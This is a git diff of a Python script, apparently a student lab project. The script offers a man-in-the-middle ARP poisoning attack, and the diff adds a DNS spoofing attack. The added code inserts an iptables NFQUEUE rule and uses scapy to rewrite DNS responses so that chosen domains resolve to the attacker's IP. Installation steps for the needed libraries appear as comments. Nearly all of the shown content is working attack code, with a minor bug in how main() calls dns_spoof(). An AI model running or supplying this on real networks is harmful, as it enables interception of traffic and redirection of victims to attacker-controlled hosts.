@@ -3,18 +3,22 @@
 
 # Imports
 from scapy.all import *
+from netfilterqueue import NetfilterQueue
+import os
+import logging as log
+from scapy.all import IP, DNSRR, DNS, UDP, DNSQR
 
 # The main method to be ran by the user of our script
 def main():
        typeOfAttack = int(input("Choose your attack. \nType 1 for a MITM ARP poisoning attack.\nType 2 for a DNS spoofing attack.\nType of attack: "))
        if (typeOfAttack == 1):
-           arppoison()
+           arp_poison()
        elif (typeOfAttack == 2):
-           #dnsSpoof()
+           dns_spoof()
        else:
            print("No or wrong input.")
 
-def arppoison():
+def arp_poison():
     # The user is given the option to choose how many hosts will be attacked during the ARP poisoning attack.
     nrOfHosts = int(input("The number of hosts you want to ARP poison: "))
 
@@ -91,5 +95,75 @@ def forward_packet(packet, macVictimList, ipVictimList, macAttacker):
             # If a match has been found we break out of the loop as only one match can be found
             break
 
-main()
+# To Do before you are able to run this method succesfully
+#
+# In terminal:
+# From: https://github.com/oremanj/python-netfilterqueue/issues/67
 
+# apt-get install build-essential python-dev libnetfilter-queue-dev
+# git clone git@github.com:kti/python-netfilterqueue.git
+# cd python-netfilterqueue
+# sudo apt-get install python3-dev
+# python setup.py install
+
+# pip3 install scapy
+# pip3 install netfilterqueue 
+def dns_spoof(ipVictim, ipAttacker, ipGatewayRouter):
+
+    class DnsSnoof:
+        def __init__(self, dns_hosts, queueNum):
+            self.dns_hosts = dns_hosts
+            self.queueNum = queueNum
+            self.queue = NetfilterQueue()
+  
+        def __call__(self):
+            log.info("Snoofing....")
+            os.system(
+                f'iptables -I FORWARD -j NFQUEUE --queue-num {self.queueNum}')
+            self.queue.bind(self.queueNum, self.callBack)
+            try:
+                self.queue.run()
+            except KeyboardInterrupt:
+                os.system(
+                    f'iptables -D FORWARD -j NFQUEUE --queue-num {self.queueNum}')
+                log.info("[!] iptable rule flushed")
+  
+        def callBack(self, packet):
+            scapyPacket = IP(packet.get_payload())
+            if scapyPacket.haslayer(DNSRR):
+                try:
+                    log.info(f'[original] { scapyPacket[DNSRR].summary()}')
+                    queryName = scapyPacket[DNSQR].qname
+                    if queryName in self.dns_hosts:
+                        scapyPacket[DNS].an = DNSRR(
+                            rrname=queryName, rdata=self.dns_hosts[queryName])
+                        scapyPacket[DNS].ancount = 1
+                        del scapyPacket[IP].len
+                        del scapyPacket[IP].chksum
+                        del scapyPacket[UDP].len
+                        del scapyPacket[UDP].chksum
+                        log.info(f'[modified] {scapyPacket[DNSRR].summary()}')
+                    else:
+                        log.info(f'[not modified] { scapyPacket[DNSRR].rdata }')
+                except IndexError as error:
+                    log.error(error)
+                packet.set_payload(bytes(scapyPacket))
+            return packet.accept()
+  
+  
+    if __name__ == '__main__':
+        try:
+            #the hosts that we try to spoof
+            dns_hosts = {
+                b"tue.com.": ipAttacker,
+                b"site.com.": ipAttacker
+            }
+            queueNum = 1
+            log.basicConfig(format='%(asctime)s - %(message)s', 
+                            level = log.INFO)
+            snoof = DnsSnoof(dns_hosts, queueNum)
+            snoof()
+        except OSError as error:
+            log.error(error)
+
+main()
